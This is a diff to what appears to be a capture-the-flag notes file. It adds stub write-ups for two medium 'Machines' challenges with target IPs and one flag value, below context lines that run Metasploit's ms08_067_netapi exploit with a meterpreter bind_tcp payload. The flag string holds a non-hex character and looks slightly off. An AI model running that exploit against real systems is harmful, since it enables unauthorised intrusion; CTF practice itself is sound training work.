@@ -148,3 +148,37 @@ PAYLOAD => windows/meterpreter/bind_tcp
 msf6 exploit(windows/smb/ms08_067_netapi) > exploit
 ```
 
+------------------------------------------------------------------------------
+# Writeups
+
+## Challenge 1 : INSIDE
+
+Challenge Category : Machines
+
+Challenge Level : Medium
+
+Challenge Description : Something here inside can you catch it 
+
+Target IP:18.185.92.165
+
+**Solution**
+
+> flag : 
+
+## Challenge 2 : Mature Blue
+
+Challenge Category : Machines
+
+Challenge Level : Medium
+
+Challenge Description : Old Friends are like gold, Old Vulns are like diamonds.
+
+Target IP1: 3.121.232.146
+
+Target IP1: 35.159.12.209
+
+**Solution**
+
+> flag : e39845c4980a36573f296b9436g259047a3
+
+
